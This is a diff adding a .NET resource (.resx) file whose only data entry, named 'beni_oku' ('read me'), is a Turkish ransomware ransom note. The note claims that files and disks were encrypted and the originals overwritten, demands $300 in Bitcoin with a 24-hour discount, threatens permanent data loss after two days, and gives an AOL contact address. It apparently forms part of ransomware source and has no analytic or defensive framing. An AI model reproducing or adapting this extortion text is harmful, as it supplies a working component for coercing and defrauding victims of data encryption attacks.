@@ -1,0 +1,65 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+<resheader name="resmimetype"><value>text/microsoft-resx</value></resheader><resheader name="version"><value>1.3</value></resheader><resheader name="reader"><value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value></resheader><resheader name="writer"><value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value></resheader><data name="beni_oku" xml:space="preserve"><value>Merhaba!
+
+Sisteminizde önemli gördüğümüz datalarınızı şifreledik. Bilindik veri kurtarma yöntemleri ile verilerinizi geri getiremeyeceğinizi -
+bilmenizi isteriz.
+Bu yöntemler sadece sizin zaman kaybetmenize sebep olacaktır.
+Yinede veri kurtarma firmaları yada programları kullanmak isterseniz lütfen asıl dosyalarınız üzerinde değil,
+bunların kopyaları üzerinde işlem yapınız ve/veya yaptırınız.
+Asıl dosyaların bozulması verilerinizin geri dönülmez şekilde zarar görmesine sebep olabilir.
+Sifrelenen dosyalarınızın asılları, üzerinde rast gele veri yazma tekniğini kullanarak silinmiştir.
+
+2 gün içerisinde dönüş yapılmadığı taktirde, sisteminizde kullanılan şifre silinecektir ve verileriniz asla geri döndürülmiyecektir.
+
+Diskleriniz Full disk encryption ile şifrelenmiştir yetkisiz müdahale kalici veri kaybına neden olur!
+
+Para verseniz daha açmazlar diyen bilgisayarcılara veya paranı alır dosyalarını vermez diyen -
+etrafınızdaki insanlara inanmayın.
+Size güven verecek kadar yeterli referansa sahibim.
+
+Sizi tanımıyorum, dolaysıyla ile size karşı kötü duygular beslemenin size kötülük yapmanın bir anlamı"da yok,
+amacım sadece bu işten bir gelir elde etmek.
+Ödeme Bitcoin ile yapılmaktadır.
+Bitcoin ne olduğunu buradan öğrenebilirsiniz : https://simple.wikipedia.org/wiki/Bitcoin
+Yaptığınız ödeme sonrasında, en kısa zamanda verilerinizi eski haline döndürmek için size özel bir şifre çözücü yapacağım -
+ve mail yoluyla size göndereceğim, ama tabi bunun için mail yoluyla bizimle iletişime geçmeniz ve bize ID"nizi göndermeniz gerekir.
+
+Şifre çözme aracının fiyatı 300 dolar.
+24 saat içerisinde dönüş yaparsanız size %50 indirim yapacağım.
+
+Ödemeyi yapmak ve verilerinizin şifresini çözdürmek için aşağıdaki iletişim kanalından bizimle iletişime geçebilirsiniz.
+
+Ulaşmak istediğinizde mutlaka aşağıda size özel üretilen ID"yi eklemeyi unutmayınız.
+
+SITE_CODE:
+ID: XXXXXXXXXX
+E-Mail: yardimail1@aol.com</value></data>
+  </root>
